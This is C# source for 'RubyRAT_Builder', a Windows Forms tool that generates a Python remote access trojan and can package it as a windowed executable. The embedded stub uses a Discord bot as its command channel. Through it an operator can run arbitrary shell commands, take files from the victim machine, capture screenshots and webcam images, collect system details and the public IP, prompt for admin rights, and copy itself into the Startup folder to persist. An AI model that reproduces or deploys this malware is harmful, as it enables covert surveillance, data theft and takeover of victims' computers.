using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace RubyRAT_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        public void OutputError(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "ERROR: " + OutputData);
            txtOutput.Text = NewText;
        }

        public void OutputInfo(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "INFO: " + OutputData);
            txtOutput.Text = NewText;
        }
        public void OutputWarning(string OutputData)
        {
            string TextBefore = txtOutput.Text;
            string NewText = TextBefore + ("\r\n" + "WARNING: " + OutputData);
            txtOutput.Text = NewText;
        }

        
        
        public string GenerateStub(string DBT)
        {
            OutputInfo("Started Generating Payload...");
            string originalStub = "import discord\r\nimport os\r\nimport platform\r\nimport requests\r\nimport subprocess\r\nimport io\r\nimport psutil\r\nimport socket\r\nimport sys\r\nimport shutil\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n# List of required modules\r\nrequired_modules = ['discord.py', 'pyautogui', 'opencv-python-headless']\r\n\r\n# Check and install required modules if needed\r\nif not running_as_executable:\r\n    missing_modules = []\r\n\r\n    for module in required_modules:\r\n        try:\r\n            __import__(module)\r\n        except ImportError:\r\n            missing_modules.append(module)\r\n\r\n    if missing_modules:\r\n        print(\"Some required modules are missing. Installing them...\")\r\n        try:\r\n            subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules)\r\n            print(\"Modules installed successfully!\")\r\n        except Exception as e:\r\n            print(\"An error occurred while installing modules:\", e)\r\n            exit(1)\r\n\r\n\r\nfrom discord.ext import commands\r\nimport pyautogui\r\nimport cv2\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\n# Bool values to set settings:\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n    category = discord.utils.get(guild.categories, name='RubyRAT')\r\n\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(system_username, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(system_username)\r\n\r\n    # Get the public IP address using an external service\r\n    public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: {public_ip}. Btw Client is admin = {is_admin()} Also if you want to know more type **!help**\")\r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    if 'hey' in message.content.lower():\r\n        await message.channel.send('Hello!')\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n    )\r\n    await ctx.send(help_message)\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            os.remove(screenshot_path)  # Remove the temporary file\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Capture an image from the webcam\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n            ret, frame = cap.read()\r\n            cap.release()\r\n\r\n            if ret:\r\n                # Save the captured image to a file\r\n                image_path = 'webcam_image.png'\r\n                cv2.imwrite(image_path, frame)\r\n\r\n                # Upload the image to Discord\r\n                await ctx.send(file=discord.File(image_path))\r\n                os.remove(image_path)  # Remove the temporary image file\r\n            else:\r\n                await ctx.send(\"Failed to capture image from webcam.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\nimport ctypes\r\nimport os\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\nimport subprocess\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    os.remove(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                if os.path.exists(exe_link_path):\r\n                    os.remove(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if is_admin():\r\n        return \"User has administrative privileges.\"\r\n    else:\r\n        return elevate_privileges()\r\n\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        # Re-run the script with elevated privileges\r\n        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        return \"Success! You should recive a new connection with a Elevated Client.\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n        sys.exit(1)\r\n\r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges.\")\r\n    else:\r\n        print(\"User does not have administrative privileges.\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    print(\"Trying to install on start...\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            OutputInfo("Finnished Generating Payload!");
            return originalStub;
        }
        
        
        // Void for generating the Python payload with the right Token
        public void GeneratePayload()
        {
            string DBT; // DiscordBotToken
            bool CTS; // CopyToStartup
            bool SE; // StartElevated

            // Get if user wants to use CTS (CopyToStartup) or not.
            if (cbCTS.Checked)
            {
                CTS = true;
            }
            else
            {
                CTS = false;
            }

            // Get if user wants to use SE (StartElevated) or not.
            if (cbSE.Checked)
            {
                SE = true;
            }
            else
            {
                SE = false;
            }

            // Get the users DBT (DiscordBotToken)
            DBT = txtInputToken.Text;

            // DEBUG Results
            OutputInfo("\r\nDBT = " + DBT + "\r\n" + "CTS = " + CTS + "\r\n" + "SE = " + SE + ".");
            // Generate the fully generated stub
            string FullyGeneratedStub = GenerateStub(DBT);

            // Display a Yes/No dialog box
            DialogResult dialogResult = MessageBox.Show("Do you want your file to be output as a .exe? (If yes, it will take some time)", "Output Format", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            string outputFileFormat;
            if (dialogResult == DialogResult.Yes)
            {
                outputFileFormat = ".exe";

                // Call functions to generate the desired output format here
                // For example, GenerateExeFile(FullyGeneratedStub);

                // Generate .py file
                string pyFileName = "output.py";
                File.WriteAllText(pyFileName, FullyGeneratedStub);

                // Run pyinstaller command
                string pyinstallerCommand;
                if (cbDM.Checked)
                {
                    pyinstallerCommand = $"pyinstaller --onefile {pyFileName}";
                }
                else
                {
                    pyinstallerCommand = $"pyinstaller --noconfirm --onefile --windowed {pyFileName}";
                }
                RunCommandVisible(pyinstallerCommand);

                // Open file path in File Explorer
                string outputPath = Path.GetDirectoryName(Application.ExecutablePath);
                string workingDirectory = Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "dist");
                OutputInfo("EXE will be here: " + workingDirectory);
                Thread.Sleep(7500); // Wait for some time...
                Process.Start("explorer.exe", workingDirectory);
            }
            else
            {
                outputFileFormat = ".py";

                // Generate .py file
                string pyFileName = "output.py";
                File.WriteAllText(pyFileName, FullyGeneratedStub);

                // Open file path in File Explorer
                Thread.Sleep(1000); // Wait for some time...
                string outputPath = Path.GetDirectoryName(Application.ExecutablePath);
                Process.Start("explorer.exe", outputPath);
            }

            OutputInfo($"Generating {outputFileFormat} file...");

            OutputInfo($"{outputFileFormat} file generated successfully!");
        }


        // Function to run a command using cmd
        private void RunCommand(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
            processInfo.CreateNoWindow = true;
            processInfo.UseShellExecute = false;
            processInfo.RedirectStandardError = true;
            processInfo.RedirectStandardOutput = true;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();
            process.Close();
        }
        private void RunCommandVisible(string command)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/k " + command); // Use /k to keep the console window open after the command finishes
            processInfo.UseShellExecute = true;
            Process.Start(processInfo);
        }



        private void btnGeneratePy_Click(object sender, EventArgs e)
        {
            GeneratePayload();
        }

        // ------------------------------------------------------------------------- //
        //
        //                          Check Boxes
        //
        // ------------------------------------------------------------------------- //
        private void cbCTS_CheckedChanged(object sender, EventArgs e)
        {

        }


        // ------------------------------------------------------------------------- //
        //
        //                          Check Boxes
        //
        // ------------------------------------------------------------------------- //


        private void btnSeeDef_Click(object sender, EventArgs e)
        {
            RunCommand("notepad defs.txt");
        }

        private void btnInstallDef_Click(object sender, EventArgs e)
        {
            RunCommandVisible("installDefs.bat");
        }

    }
}
